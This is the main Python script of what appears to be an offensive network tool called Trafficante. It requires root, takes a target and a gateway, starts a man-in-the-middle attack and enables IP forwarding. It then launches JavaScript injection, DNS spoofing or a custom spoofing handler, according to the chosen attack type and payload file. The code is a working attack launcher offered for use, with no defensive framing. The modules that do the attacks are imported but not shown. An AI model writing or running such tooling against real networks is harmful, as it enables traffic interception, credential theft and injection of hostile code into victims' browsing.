# github.com/n0nexist/Trafficante

import modules.utils as utils
import modules.injector as inj
import modules.mitm as mitm
import modules.dns_spoof as dns
import modules.custom_handler as ch
from threading import Thread as th

utils.checkroot()
utils.cls()
utils.logo()

target, gateway, attacktype, payloadfile = utils.args()
payloadfile = payloadfile.lower()

th(target=mitm.start_mitm,args=(target, gateway,)).start()
utils.enable_forwarding()

if attacktype == "js":
    th(target=inj.start_injecting,args=(payloadfile,)).start()
elif attacktype == "dns":
    th(target=dns.start_spoofing,args=(payloadfile,)).start()
elif attacktype == "custom":
    th(target=ch.start_spoofing,args=(payloadfile,)).start()
else:
    utils.showhelp()